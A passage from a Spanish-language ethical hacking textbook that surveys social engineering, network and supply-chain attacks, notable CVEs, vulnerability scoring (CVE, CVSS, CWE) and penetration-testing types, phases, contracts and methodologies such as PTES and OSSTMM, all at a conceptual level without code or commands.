La ingeniería social utiliza la manipulación de los usuarios mediante el engaño para lograr que éstos realicen alguna acción perjudicial para ellos. Los ataques basados en ingeniería social son muy habituales y ocurren con mucha frecuencia en numerosos fraudes, ya que se aprovechan del desconocimiento y la falta de formación en TIC en general, y en ciberseguridad en particular. En el Apartado 5.1.1 se hablará de los aspectos psicológicos que están detrás del funcionamiento de las técnicas de ingeniería social.

Los tipos de ataques más habituales que utilizan técnicas de ingeniería social son los siguientes:

- **Fraude online**. Como se vio en la Tabla 1.1, los fraudes son con mucha diferencia el ciberdelito más frecuente. Suelen colarse en plataformas oficiales, por ejemplo, falsa venta de productos, alquileres de alojamientos, servicios o tiendas que simulan otras reales pero alojadas en direcciones URL diferentes y a las que se llega clicando en enlaces manipulados. Los fraudes son muy variados, por lo que es imposible abordarlos todos. El INCIBE dispone de una sección de historias reales de fraudes online que es recomendable leer para conocer la diversidad de técnicas y estrategias que utilizan los delincuentes. [Historias reales de fraudes online](https://www.incibe.es/linea-de-ayuda-en-ciberseguridad/casos-reales).
- **Phishing**, **vishing** y **smishing**. Estos términos se refieren a los mensajes que se reciben cuyo contenido y aspecto visual suplantan la identidad de un emisor legítimo, como puede ser un organismo oficial, un banco, una red social, etc., para que se acceda a ellos a través de un enlace o URL manipulada. Si se cae en la trampa y se introducen datos personales y credenciales en estas webs falsas, estos irán a parar a los ciberdelincuentes. Los nombres de los ataques se refieren a la vía habitual por la que Ilegan los mensajes falsos: el phishing utiliza como medio de difusién el correo electrónico o las redes sociales, el vishing las llamadas telefónicas y el smishing los SMS. En los Apartados 5.1.2 y 5.1.3 se estudía de forma practica este tipo de ataque.
- **Baiting** (gancho). Este ataque utiliza un cebo o gancho para que el usuario pique y descargue algun tipo de software malicioso. También es muy utilizado en titulares de noticias para hacer picar y acceder a ellas para aumentar las visitas, con el consiguiente aumento en su beneficio económico.
- **Shoulder surfing** (mirando por encima del hombro). Con esta técnica se puede obtener información personal o confidencial, como contraseñas, simplemente mirando por encima del hombro o de reojo. Aunque pueda parecer
  absurdo o algo imposible, es una técnica que se ha utilizado desde siempre y sigue siendo usada en los ejercicios de Red Team.
- **Dumpster diving** (rebuscando en la basura). A veces los usuarios y las empresas tiran a la basura documentos o material que puede revelar información importante. Por ejemplo, el material informático desechado (equipos, USB, tarjetas de memoria) puede contener información recuperable sino han sido formateados adecuadamente.

#### Ataques a las conexiones

Este tipo de ataque aprovecha las redes de interconexión entre computadoras. Las redes pueden ser cableadas o inalámbricas, por lo que habrá ataques específicos para cada tipo. Los ataques a las conexiones más comunes son:

- **Ataques DDoS** (Distributed Denial of Service). Este ataque busca la caída o el colapso de un servicio online realizando una cantidad ingente de peticiones, de forma que el servicio no puede atenderlas todas. En el año 2021, la empresa Cloudflare informó de un ataque DDoS de 17,2 Mrps (millones de peticiones por segundo) que logró mitigar en lo que era el mayor ataque DDoS de la historia hasta ese momento. Un año después, en 2022, [Google Cloud](https://www.genbeta.com/seguridad/google-cloud-bloquea-mayor-ataque-ddos-historia-tres-veces-mayor-que-record-establecido-hace-justo-ano) informaba de que había logrado mitigar un ataque tres veces mayor al sufrido por Cloudflare, en este caso de 46 Mrps. En agosto de 2023 se establecía un nuevo record por parte de Google al anunciar que habia mitigado un ataque de 398 Mrps. Con toda seguridad, este récord volverá a ser superado.
- **Ataques de intermediario** (MitM, Man-in-the-Middle). Para realizar este ataque se utilizan diversas técnicas (como el spoofing) para que un usuario malicioso se coloque en medio de una comunicación, por lo que podrá ver y modificar el trafico que pasa por ella si este no va cifrado. En la Unidad 5 se verá de forma práctica cómo realizar este tipo de ataques.

* **Ataques de suplantación** (spoofing). Este ataque busca falsificar o suplantar algún dato de la conexión de red para hacerse pasar por otro. Hay multitud de ataques: ARP Spoofing, IP Spoofing, MAC Spoofing, DNS Spoofing, etc. Estos
  ataques se suelen emplear en el ataque de intermediario.
* **Escucha de conexiones** (sniffing). Las conexiones pueden ser escuchadas por usuarios que comparten un mismo canal de comunicación. En caso de conexiones inalámbricas, el riesgo es mucho mayor puesto que cualquiera que esté dentro del rango de cobertura de la red puede capturar el trafico y analizarlo. Para prevenir el éxito de estos ataques se deben emplear protocolos seguros en las conexiones, como HTTPS frente a HTTP, SSH frente a Telnet o SFTP frente a FTP.
* **Redes trampa** (Rogue AP). Un ataque habitual en las redes Wi-Fi es crear un punto de acceso falso que simula otro legítimo (Apartado 7.2.4). Suelen crearse en lugares públicos como aeropuertos, estaciones de tren, cafeterías y centros comerciales para aprovecharse de usuarios que quieren utilizar conexiones gratuitas. Eran más habituales hace unos años cuando aun no estaban extendidas las tarifas planas y el roaming de datos en los dispositivos móviles. En todo caso, se debe desconfiar siempre de las conexiones abiertas.

#### Ataques a la cadena de suministro

Los ataques a la cadena de suministro ([supply chain attacks](https://www.wired.com/story/hacker-lexicon-what-is-a-supply-chain-attack/)) buscan vulnerar los sistemas hardware o software de un tercero que pertenece a la cadena de suministro del objetivo principal. El motivo de este ataque es que la corporación objetivo confía en los productos que adquiere de ese proveedor y las revisiones de seguridad que realiza sobre estos son escasas o nulas. Un ejemplo de este tipo de ataque consistiría en infectar con malware una librería de software que luego es empleada en el desarrollo de una herramienta por parte de la empresa de desarrollo.

Hay multitud de ejemplos de ataques de este tipo sufridos por diferentes corporaciones, pero el más relevante por sus dimensiones fue el hackeo de SolarWind, una empresa de desarrollo de software proveedora de importantes agencias
gubernamentales estadounidenses y de otras partes del mundo. Un grupo de hackers ruso, segdn todas las sospechas, logré implantar código malicioso en el software Orion, usado por unas 18 000 corporaciones de distintos paises, entre las que se incluyen la NASA, el Departamento de Estado, el Departamento de Defensa y el Departamento de Justicia de los EE. UU.

Para evitar este tipo de ataque se establecen medidas que buscan implantar lo que se conoce como Zero Trust Security, o seguridad de confianza nula, cuyo concepto principal es «nunca confiar, siempre comprobar». El NIST (National Institute of Standards and Technology) publicó en 2022 un white paper” ([NIST Releases Cybersecurity White Paper. Planning for a Zero Trust Architecture](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.20.pdf)) para la implantación de arquitecturas zero trust en la administración federal americana y que sirve de referencia para otras organizaciones del resto del mundo. Esta publicación complementa a la [guía especial SP-800-207](https://dreamlab.net/media/img/news/2024_news/Arquitectura_de_confianza_cero-NIST.SP.800-207.pdf) donde se presenta un modelo de arquitectura zero trust.

De forma resumida, la arquitectura zero trust redefine, de una manera más amplia, el tradicional perímetro de red de una organización a la situación actual en la que existen trabajadores en remoto, oficinas remotas con su propia infraestructura, servicios de la empresa que están alojados en plataformas cloud de terceros, entre otros muchos elementos.

#### Ataques invisibles en el código fuente

Este tipo de ataque es realmente novedoso y difícil de detectar. El atacante incluye en el código fuente del programa caracteres Unicode especiales que no son visibles en el editor de texto. Cuando se revisa el código, este es en apariencia inofensivo; sin embargo, los caracteres invisibles hacen que la lógica de la aplicación sea totalmente distinta a la esperada ([ataque Trojan Source](https://trojansource.codes/)).

Para conseguir que el ataque tenga éxito se debe aprovechar alguna vulnerabilidad de los compiladores en el tratamiento que hacen de los caracteres de control Unicode. El descubrimiento de este tipo de vulnerabilidad se realizó en 2021 y por sus características es muy propicio para los ataques a la cadena de suministro estudiados en el apartado anterior.

### Vulnerabilidades

Una vulnerabilidad o bug es un fallo de diseño de un sistema que pone en riesgo su funcionamiento y su seguridad. El primer fallo informático detectado se produjo el 9 de septiembre de 1947 en el laboratorio de cálculo de la Universidad de Harvard. Grace Murray Hopper trabajaba como programadora del ordenador Mark II, uno de los primeros ordenadores de la historia. Ese día, Grace anotó en el libro de registro que se había detectado un fallo debido a la presencia de una polilla, coloquialmente un bicho (bug en inglés), en uno de los relés del computador, de ahí el origen de este término.

![https://upload.wikimedia.org/wikipedia/commons/f/ff/First_Computer_Bug%2C_1945.jpg](https://upload.wikimedia.org/wikipedia/commons/f/ff/First_Computer_Bug%2C_1945.jpg)Figura 1.3. Imagen de la polilla en el diario del ordenador Mark Il.
(Fuente: https://en.wikipedia.org/wiki/Harvard_Mark_I).

En los siguientes subapartados se detallan los diferentes tipos de vulnerabilidades y sus causas, así como la forma en la que se reportan y documentan esas vulnerabilidades.

#### Causas y tipos de vulnerabilidades

El primer bug se debió a un elemento externo que provocó el mal funcionamiento del sistema informático. Hoy en día esto no es lo habitual y el mal funcionamiento o los fallos que suceden en los sistemas informáticos son provocados por errores en su diseño o implementación. Dado que los sistemas informáticos se componen de elementos software y hardware, se puede diferenciar entre vulnerabilidades de software y vulnerabilidades de hardware.

Las vulnerabilidades de software afectan a los programas informáticos y ocurren habitualmente por errores de programación en su código fuente, fallos de configuración, etc. Normalmente, estos errores no son intencionados, pero no en pocas ocasiones se han dejado de forma intencionada para crear puertas traseras o *backdoors* que permitan el acceso remoto, principalmente de agencias de información gubernamentales, sin necesidad de mucho esfuerzo ([Microsoft handed the NSA access to encrypted messages](https://www.theguardian.com/world/2013/jul/11/microsoft-nsa-collaboration-user-data)).

Los errores en el software suceden a todos los niveles del sistema informático y basta con que haya un elemento inseguro para poner en peligro el sistema completo. Por ejemplo, en una aplicación web intervienen numerosos componentes: el servidor web, la aplicación web, el entorno de ejecución de la aplicación según la tecnología empleada, las librerías de terceros, etc. Puede ser que el código de nuestra aplicación tenga alguna vulnerabilidad o puede que se haya hecho una auditoría y se hayan resuelto todos los problemas, pero si no se han mantenido actualizados el resto de los componentes (librerías, servidor web...) es muy probable que el sistema en su conjunto sea vulnerable.

Imaginemos que hemos desarrollado nuestra aplicación web ficticia con tecnologías Java. Por ejemplo, puede haber sido descubierta una nueva vulnerabilidad en una librería de terceros que se utiliza en la aplicación. Este último ejemplo es el caso de la vulnerabilidad *log4shell* (CVE-2021-44228), descubierta en la librería *log4j* ([Log4Shell: análisis de vulnerabilidades en Log4j](https://www.incibe-cert.es/blog/log4shell-analisis-vulnerabilidades-log4j)). Esta librería es utilizada por desarrolladores Java para registrar eventos e información relevante en *logs* y su uso está ámpliamente generalizado, por lo que el impacto de la vulnerabilidad fue enorme.

También puede suceder que la vulnerabilidad se encuentre en el *framework* utilizado para desarrollar la aplicación web; es el caso de la vulnerabilidad conocida como *Spring4shell* (CVE-2022-22965) que afecta al núcleo del *framework* Spring y que permite la ejecución remota de código (RCE). Ambas vulnerabilidades podrían estar presentes en nuestra aplicación web ficticia aun cuando el código escrito por nosotros sea seguro.

Los errores de software también se pueden producir en el sistema operativo o en alguno de sus módulos o componentes. Estos errores pueden ser más graves aún, ya que podrían permitir a los atacantes ejecutar código con más privilegios de los que les permite su cuenta o el proceso desde el que estén actuando.

Imaginemos que un atacante logra tener acceso a nuestro sistema por medio de una vulnerabilidad en nuestro servidor web (Apache, IIS, Nginx, etc.) o empleando alguna de las vulnerabilidades mencionadas anteriormente. Esto le permitirá ejecutar comandos con los mismos privilegios que el proceso hackeado. Sin embargo, una vez dentro del sistema, si el sistema operativo tampoco está correctamente actualizado o configurado, el atacante podría escalar privilegios y convertirse en administrador del sistema. En la Unidad 6 se estudian estas técnicas para sistemas operativos Linux y Windows; aquí solo se mencionan dos que perfectamente podrían afectar al sistema de nuestra aplicación web ficticia: *PwnKit* (CVE-2021-4034 [Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)) en Linux y *HiveNightmare* (CVE-2021-36934 [HiveNightmare aka #SeriousSAM — anybody can read the registry in Windows 10](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5 )) en Windows.

Otro error muy común que suele aparecer en el software es el mal uso de la criptografía. Este mal uso ocurre habitualmente por una generación errónea de las claves criptográficas o una mala implementación de los algoritmos criptográficos. Un ejemplo notable de este error es la vulnerabilidad ***Zerologon*** (CVE-2020-1472 [HiveNightmare aka #SeriousSAM — anybody can read the registry in Windows 10](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)) presente en diversas versiones de Windows Server, que permite a cualquier usuario en la red convertirse en administrador del dominio. Esta vulnerabilidad se aprovecha de un fallo de implementación en la criptografía del protocolo **Netlogon Remote Protocol**, que se emplea para la autenticación de usuarios y máquinas en redes de dominio de Microsoft Windows, y en particular en la elección del vector de inicialización en el algoritmo criptográfico empleado: AES-CFB8. En el laboratorio del Apartado 5.7.3 se explica su explotación.

Las vulnerabilidades hardware son un tipo de vulnerabilidad que un atacante puede llegar a aprovechar para saltarse todas las protecciones del sistema operativo y demás capas de software para obtener información valiosa. El ejemplo más representativo de esta categoría son las vulnerabilidades [***Meltdown***](https://meltdownattack.com/) (CVE-2017-5754) y [***Spectre***](https://meltdownattack.com/)(CVE-2017-5753 y CVE-2017-5715) descubiertas en 2017 y hechas públicas en enero de 2018. Aprovechan una vulnerabilidad en la ejecución fuera de orden y en la ejecución especulativa de código que utilizan los procesadores para mejorar el rendimiento. De forma muy simplificada, estas vulnerabilidades permiten a un proceso leer datos a los que no debería tener acceso.

En julio de 2022 fue descubierta la vulnerabilidad Retbleed (CVE-2022-29900 y CVE-2022-29901), en referencia a retpoline, la técnica que fue diseñada como medida de defensa para mitigar las vulnerabilidades de ejecución especulativa como Spectre. En julio de 2023 se publicó la vulnerabilidad Zenbleed (CVE-2023-20593) que afecta a la serie de procesadores Zen 2 de AMD. En agosto de 2023, una nueva vulnerabilidad publicada, Inception (CVE-2023-20569), afecta a las series de procesadores Zen 3 y Zen 4 de AMD.

Otro tipo de vulnerabilidad de hardware destacada es Rowhammer, que afecta a las memorias DDR DRAM, y que permite modificar bits en la memoria tras accesos repetidos.

También se pueden incluir en esta categoría las vulnerabilidades en las consolas de videojuegos, como por ejemplo FreeHDBoot y FreeDVDBoot, que durante años han sido aprovechadas por los crackers para evitar los sistemas anticopia ([Hacker TheFlow discloses blu-ray disc exploit toolchain (PS4/PS5)](https://wololo.net/2022/06/11/ps5-ps4-hacker-theflow-discloses-blu-ray-disc-exploit-toolchain-ps5-piracy-not-a-matter-of-if-but-when/).

Una vulnerabilidad que no ha sido reportada de forma oficial o que se ha publicado sin que haya dado tiempo al desarrollador a publicar un parche se conoce como vulnerabilidad de día cero o **zeroday**. Existen plataformas, como Zerodium, que ofrecen grandes sumas de dinero por la venta de esa información, en contraposición a las plataformas de recompensas (bug bounty) en donde los fabricantes pagan por el reporte responsable de dichas vulnerabilidades para poder resolverlas antes de que se hagan públicas. En el Apartado 1.5.5 se explican con más detalle estas plataformas.

![https://zerodium.com/images/zerodium_prices_mobiles.png](https://zerodium.com/images/zerodium_prices_mobiles.png)

Figura 1.4. Cuantías por diferentes tipos de vulnerabilidades en plataformas móviles.
(Fuente: https://zerodium.com/program.html).

En la Figura 1.4 se pueden observar las cuantías que paga la plataforma Zerodium por distintas vulnerabilidades, en este caso en plataformas móviles. Por una vulnerabilidad **zero click**, es decir, que el usuario no tiene que intervenir para nada, se pagan dos millones y medio de dólares, si es para Android, y dos millones de dólares para iOS. Zerodium es lo que se conoce como un broker de vulnerabilidades; adquieren la información para luego venderla a terceros, por lo que se desconoce a dónde irá a parar, aunque podemos tener algunas sospechas: gobiernos de cualquier índole, empresas como NSO Group (los desarrolladores del software espía Pegasus), etcétera.

#### Documentación de vulnerabilidades

En el apartado anterior se describieron diferentes tipos de vulnerabilidades y algunos ejemplos relevantes mostrando su CVE. El CVE (Common Vulnerabilities and Exposures) es un sistema que provee un identificador numérico que se asigna a las vulnerabilidades de seguridad que se informan públicamente. El identificador se compone de tres elementos: CVE-XXXX-YYYYY, donde los cuatro primeros dígitos corresponden al año en el que se hace pública la vulnerabilidad y los siguientes corresponden al identificador de la vulnerabilidad de ese año. El listado de todas las vulnerabilidades puede consultarse en la web de la corporación [MITRE](www.cve.org).

Las vulnerabilidades son evaluadas para conocer su gravedad. El CVSS (Common Vulnerability Scoring System) es el sistema que se emplea para realizar esta valoración y su última versión es la 4. El sistema emplea una serie de métricas en diferentes categorías. La puntuación base contiene los elementos principales que ofrecen una puntuación global entre 0 y 10, junto con otros elementos opcionales (métrica temporal y de entorno) que corrigen o ajustan esa puntuación base.

En función del rango de puntuación calculado para la vulnerabilidad, esta tendrá un rango de gravedad según la Tabla 1.2.



| GRAVEDAD | RANGO DE CVSS |
| :------: | :-----------: |
|   Baja   |   0.0 - 3.9   |
|  Media   |    4.0-6.9    |
|   Alta   |   7.0 - 8.9   |
| Critica  |  9.0 - 10.0   |

En la Figura 1.5 se puede ver la puntuación para la versión anterior 3.1 de una vulnerabilidad crítica con un CVSS de 9.4. Esta vulnerabilidad puede explotarse a través de la red (AV) por un usuario sin privilegios (PR) y que no necesita la interacción de otros usuarios (UI), además de ser sencilla de explotar (AC). Además, afecta de manera importante a la integridad (I) y disponibilidad (A), y de forma menos importante a la confidencialidad (C). El atributo scope (S) permanece inalterado ya que la vulnerabilidad no afecta a otro componente distinto al que se encuentra.

![image-20241015143815859](./img/fig1.5.png)Figura 1.5. Ejemplo de puntuación en base empleando CVSS.
(Fuente: https://www.first.org/cvss/calculator/3.1).

Asimismo, las vulnerabilidades se pueden clasificar en diferentes categorías. El [CWE](https://cwe.mitre.org/) (Common Weakness Enumeration) dispone de una clasificación exhaustiva de todos los posibles tipos de vulnerabilidades hardware y software. Ofrece también una lista de las 25 vulnerabilidades de software más comunes (CWE Top 25), entre las que se encuentran CWE-79 (Cross-site Scripting), CWE-89 (SQL Injection), CWE-20 (Improper Input Validation), CWE-352 (CSRF, Cross-Site Request Forgery), CWE-22 (Path Traversal), CWE-77 (Command Injection) y CWE-918 (SSRF, Server-Side Request Forgery). Todas ellas están relacionadas con el hacking de aplicaciones web que se estudia en la Unidad 4.

Desde el punto de vista de un hacker ético es importante conocer esta información cuando se realizan auditorías de seguridad, puesto que por mera estadística las vulnerabilidades estarán presentes con una frecuencia similar.

## Test de intrusión o pentest

Un test de intrusión, o penetration testing (abreviado pentest), es una actuación legítima de un hacker que trata de vulnerar los servicios de una empresa para hacerse con su control. Los objetivos y el alcance del test de intrusión se establecen por contrato, que incluye, entre otros aspectos, una cláusula de confidencialidad.

El objetivo del test de intrusión es analizar el estado de seguridad de los servicios de una empresa mediante la búsqueda activa de vulnerabilidades. De este modo, la empresa que contrata el pentest trata de anticiparse y protegerse ante posibles ataques de cibercriminales. Al concluir el test de intrusión se presenta un informe de resultados donde se describen y analizan los problemas de seguridad descubiertos y se proponen soluciones a los mismos.

En Internet se pueden encontrar informes de test de intrusión de empresas y organizaciones que los hacen públicos como medida de transparencia de sus servicios o del software que desarrollan (Repositorios con informes públicos de test de intrusión https://pentestreports.com/
https://github.com/juliocesarfort/public-pentesting-reports/). También se pueden encontrar informes de empresas de auditoría que evalúan la seguridad de ciertos servicios y aplicaciones de forma independiente.

En los siguientes apartados se profundiza en los distintos elementos que caracterizan un test de intrusión.

### Tipos de auditorías

El test de intrusión puede realizarse teniendo en cuenta diversos factores. El primero de ellos es el conocimiento que tiene el pentester de los elementos internos de la empresa, como archivos de configuración, código fuente, esquemas de red, políticas de seguridad, etc. Según sea este conocimiento, se diferencian los siguientes tipos de auditorías:

- Auditoría de caja negra. En este caso el auditor toma el rol de un hacker que no tiene, a priori, ningún conocimiento de la organización.

- Auditoría de caja blanca. El auditor tiene acceso total a la información interna de la empresa. Se revisan todos los sistemas, versiones de software y sistemas operativos, configuraciones, políticas, etc. Asimismo, esta auditoría puede consistir en la revisión del código fuente del software si la empresa se dedica al desarrollo. Auditoria de caja gris. El auditor dispone de un conocimiento parcial o limitado de la organización. Por ejemplo, la auditoria podría consistir en revisar la seguridad de una aplicación web, en la que tendría ciertos permisos, pero sin acceso al código fuente.


Otro factor para tener en cuenta a la hora de diseñar la auditoría es la posición que toma el pentester con respecto a la situación de los recursos de la empresa. En este caso se diferencia entre:

- Auditoría perimetral. El auditor asume el papel de un hacker que trata de descubrir una vía de entrada a los sistemas internos de la organización a través del análisis de seguridad del perímetro de esta. Se analizan configuraciones DNS, rangos de direcciones IP y servicios en uso, redes inalámbricas y cualquier información relevante que pueda ayudar a obtener acceso.

- Auditoría interna. El auditor toma el rol de un empleado o insider con escasos o nulos privilegios en la organización, o de un invitado que se conecta a la red corporativa. La auditoría se realiza in situ y comienza desde un segmento de red alejado de los servicios críticos.

- Auditoría interna con privilegios. Similar a la anterior, pero en este caso el auditor puede tener acceso a las configuraciones, código fuente, políticas de seguridad, etcétera.

Por último, según el alcance de los servicios o recursos que quieren ser auditados, se distingue entre:

- Auditoría web. Evalúa la seguridad de la web. Puede ser de forma externa sin permisos (perimetral), con permisos de un usuario con credenciales (interna) o auditando el código fuente (caja blanca).

- Auditoría de aplicaciones móviles. Permite conocer el grado de seguridad de las apps de la empresa. Se puede realizar a diferentes niveles, como en el caso de la web.

- Auditoría wireless y VoIP (Voice over IP). Permite conocer el estado de seguridad de las comunicaciones inalámbricas y de voz.

- Prueba de estrés DoS/DDoS. Se evalúa la fortaleza de la infraestructura ante situaciones de alta carga.

Los distintos tipos de auditorías que se presentan en este apartado no están compartimentados, al contrario, cada test de intrusión definirá un tipo u otro en función de los objetivos que se persigan. Por ejemplo, una organización puede querer evaluar el grado de seguridad de su perímetro frente a amenazas externas desconocidas, por lo que una auditoría perimetral de caja negra sería más apropiada. Otra, en cambio, puede estar interesada en conocer el grado de compromiso ante exempleados o empleados descontentos, por lo que una auditoría interna o perimetral de caja gris sería la más adecuada.

### Fases de un test de intrusión

La realización de un test de intrusión se desarrolla en diferentes fases o etapas, cada una de las cuales tiene un alcance y un objetivo distintos. Existen diferentes propuestas en cuanto a cómo dividir estas etapas, pero de forma general se pueden establecer estas cinco:

1. **Fase de reconocimiento o footprinting**. En esta fase se trata de realizar un análisis preliminar del objetivo, recabando toda la información posible utilizando fuentes públicas. Se debe tener en cuenta que esta fase no es intrusiva, no se comete ninguna ilegalidad ya que la información que se toma está al alcance de cualquiera. Todo lo relacionado con esta fase se estudia en la Unidad 2.

2. **Fase de enumeración o fingerprinting**. En esta fase se continúa con la recopilación de información del objetivo, pero de manera activa, lo que significa que se interactúa directamente con el mismo, por lo que es imprescindible disponer de permiso para ello. Dentro de esta fase se realizan acciones como el escaneo de puertos abiertos y el análisis y descubrimiento de vulnerabilidades, que se estudian en la Unidad 3.

3. **Fase de explotación**. Con la información obtenida en las fases 1 y 2 se dispone de una información amplia del objetivo. El objetivo de esta fase es diseñar un vector de ataque para lograr la entrada en los sistemas aprovechando algún error de configuración, contraseñas débiles, servicio o aplicación vulnerables, etc. Las técnicas relacionadas con los objetivos de esta fase se explican en las Unidades 4, 5 y 7.

4. **Fase de posexplotación**. Esta fase comienza tras acceder a los sistemas del objetivo. Una vez dentro, las acciones que se desarrollan son de tipos diversos. Una de ellas es comprobar los privilegios que se poseen y analizar el sistema para elevar o escalar estos hacia un usuario más privilegiado. Otra acción consiste en analizar el entorno de red donde se sitúa el sistema vulnerado, estudiando posibles saltos a otros sistemas más interesantes. Todo esto se estudia en la Unidad 6.

5. **Fase de documentación**. En esta última fase del test de intrusión se debe elaborar el informe que recoja los detalles de este. A menudo, se suelen elaborar dos tipos de informes, un informe ejecutivo para la alta dirección y un informe técnico dirigido al personal de IT.

Los cibercriminales siguen un esquema similar, salvo en la última fase, en la que ellos tratan de borrar las huellas que hayan podido generar y garantizar accesos futuros instalando rootkits y herramientas de comando y control (Command & Control - C2) que permiten manejar y enviar órdenes a los equipos controlados de forma remota o exfiltrar información para luego extorsionar a la empresa (Apartado 6.1.1).

### El contrato del test de intrusión

Los detalles de cómo debe llevarse a cabo el test de intrusión, como por ejemplo los servicios que serán auditados o la duración del test, deben estar acordados previamente con el cliente mediante un contrato que deben firmar ambas partes. En la bibliografía anglosajona se refieren a este acuerdo como *rules of engagement* (reglas de compromiso). Este documento debe dar respuesta a preguntas como:

- ¿En qué horario debe realizarse el pentest? ¿Hay servicios críticos donde la carga de trabajo no puede superar un cierto umbral?

- ¿Se van a realizar pruebas de denegación de servicio?

- ¿Está permitida la ingeniería social a empleados?

- ¿El personal de la organización o el personal de IT tendrá conocimiento del test?

- ¿Está permitido instalar backdoors o usar exploits peligrosos?

Resulta difícil encontrar ejemplos de contratos de test de intrusión reales entre corporaciones privadas, pero sí se encuentran ejemplos en los pliegos de contrataciones por parte de organismos públicos que deben publicarse en los boletines oficiales, por ejemplo, el de la contratación de un test de intrusión por parte de Loterías y Apuestas del Estado ([Procedimiento de selección de empresas de servicios para la evaluación de vulnerabilidades y test de intrusión](https://contrataciondelestado.es/wps/wcm/connect/0b1fd855-5f4c-4cb5-a826-65c1297b169d/DOC2018111213275818_298+PT+test+vulnerabilidades+e+intrusion.pdf?MOD=AJPERES)).

### Metodologías de pentesting

El esquema general que describe las fases del test de intrusión presentado anteriormente tiene sus particularidades y diferencias en función de la metodología concreta que se consulte. Una metodología es un documento de referencia que ayuda a mejorar la calidad de los procesos y sirve de guía y orientación en la realización de las auditorías. Por tanto, no se trata de un documento normativo; cada organización puede adaptarlo a sus necesidades.

Para profundizar en los elementos que intervienen en una auditoría de seguridad es recomendable consultar la *Web Security Testing Guide* (WSTG), un documento elaborado por el OWASP (Open Web Application Security Project). El documento está enfocado a la auditoría de aplicaciones web, pero las primeras secciones exponen las características que debe tener cualquier tipo de auditoría, y en concreto en la Sección 3.8 de este se hace una revisión de las principales metodologías de pentesting ([Web Security Testing Guide del OWASP](https://owasp.org/www-project-web-security-testing-guide/)).

En los siguientes apartados se explican de forma breve las metodologías de pentesting más relevantes.

####   PTES (Penetration Testing Execution Standard)

La metodología PTES [Web de la metodología PTES](http://www.pentest-standard.org) comenzó a elaborarse en 2009 por un grupo de expertos de diferentes empresas y consultorías de seguridad. Se encuentra en la versión 1.0, pero se espera que pronto esté disponible una versión 2.0 actualizada que incluirá el concepto de niveles, donde se establecerá la intensidad del test de intrusión en función de la sofisticación del adversario. Esta metodología divide un test de intrusión en siete fases:

1. **Interacciones previas (pre-engagement interactions)**. En esta fase se ofrece información sobre aspectos como estimación de tiempo y coste del pentest, cuestionarios que realizar al cliente, ámbito, alcance del test de intrusión, objetivos y el contrato del test de intrusión, entre otros.
   
2. **Recopilación de inteligencia (intelligence gathering)**. En esta fase se trata de obtener información del objetivo lo más valiosa y útil posible. El estándar establece tres niveles (L1, L2 y L3) de información. El primer nivel es información que se puede obtener sin apenas esfuerzo utilizando herramientas automáticas. El segundo nivel consiste en información que se puede obtener con herramientas del primer nivel y algo de análisis manual. El tercer nivel incluye la información de los niveles anteriores, pero hay una gran cantidad de análisis manual que permite un gran conocimiento del objetivo y sus relaciones empresariales y de negocio.
   
3. **Modelado de amenazas (threat modeling)**. En esta fase se trata de elaborar un modelo de amenazas identificando los principales activos de la organización. Este modelo se construye con la colaboración de la empresa; incluso en auditorías de caja negra el auditor debe crear el modelo de amenazas a partir de la información recopilada.
   
4. **Análisis de vulnerabilidades (vulnerability analysis)**. En este proceso se trata de descubrir los fallos en los sistemas que pueden ser aprovechados por un atacante.
   
5. **Explotación (exploitation)**. En esta fase el objetivo es lograr el acceso a los sistemas de la organización evitando cualquier restricción de seguridad. La prioridad será identificar el punto de entrada principal que facilite la obtención de los activos de mayor valor.
   
6. **Posexplotación (post-exploitation)**. En esta fase se debe valorar el sistema comprometido y garantizar accesos futuros. También se deben estudiar las relaciones entre los dispositivos de red que permitan ganar acceso a otros sistemas, y también se incluyen las acciones de exfiltración de datos.
   
7. **Informe (reporting)**. En esta última fase del estándar se explica cómo se debe elaborar la documentación que se entregará al cliente una vez que finalice el test de intrusión. Esta documentación debe incluir dos secciones, el resumen ejecutivo y el informe técnico.

 Adicionalmente, el estándar facilita una guía técnica donde se incluye una recopilación de herramientas útiles para cada una de las fases descritas anteriormente.

#### OSSTMM (Open Source Security Testing Methodology Manual)

La metodología OSSTMM fue elaborada y publicada con acceso libre en 2001 por el ISECOM (Institute for Security and Open Methodologies). La versión actual es la 3.0, publicada en diciembre de 2010.

La metodología incluye la posibilidad de certificar la auditoría a la empresa por medio del documento STAR (Security Test Audit Report). Para medir la superficie de exposición de la empresa se emplea la medida estándar RAV. Hay dos formas de representar esta medida:

1. Como un valor que puede ser positivo o negativo. Un valor positivo significa que se gasta demasiado en controles, mientras que un valor negativo significa que hay una falta de controles que hacen que no se esté protegiendo debidamente el objetivo.
   
2. De forma similar a un porcentaje, en este caso se calcula como un logaritmo en base 10 en donde el valor 100 es la medida de balance perfecta.

La metodología OSSTMM v3 incluye 5 canales (a cada uno de ellos se les dedica una unidad completa, entre la 7 y la 11) sobre los que se debe probar la seguridad de la organización:

- **Seguridad humana**. Este canal cubre la interacción con las personas. Además de la ingeniería social, este canal cubre otros aspectos como regulaciones y legislación, políticas de seguridad de la empresa, etcétera.
- **Seguridad física**. En este canal se cubre la auditoría de los elementos físicos del sistema y la posibilidad de vulnerarlos por la presencia de un individuo.
- **Seguridad en las comunicaciones inalámbricas**. Este canal cubre las comunicaciones del objetivo en un rango de proximidad cercano.
- **Seguridad en las telecomunicaciones**. Este canal cubre las comunicaciones del objetivo que discurren por la red cableada e incluye tanto comunicaciones analógicas (telefónicas) como digitales.
- **Seguridad en las redes de datos**. Este canal cubre las comunicaciones entre redes de computadoras y sistemas operativos en red.

La ejecución de la metodología incluye 4 fases, en cada una de las cuales se llevan a cabo una serie de módulos de prueba. Las fases son las siguientes:

- **Fase de inducción**. La auditoría comienza con la comprensión de los requisitos, el ámbito y las restricciones de la auditoría. Esta fase incluye los módulos posture review, logistics y active detection verification.
  
- **Fase de interacción**. En esta fase se trata de conocer los diferentes sistemas y las interacciones entre ellos. Incluye los módulos visibility audit, access verification, trust verification y control verification.
  
- **Fase de encuesta**. El objetivo de esta fase es que el auditor descubra información desconocida. Es la más extensa de la metodología e incluye los módulos process verification, configuration verification, property validation, segregation review, exposure verification y competitive intelligence scouting.
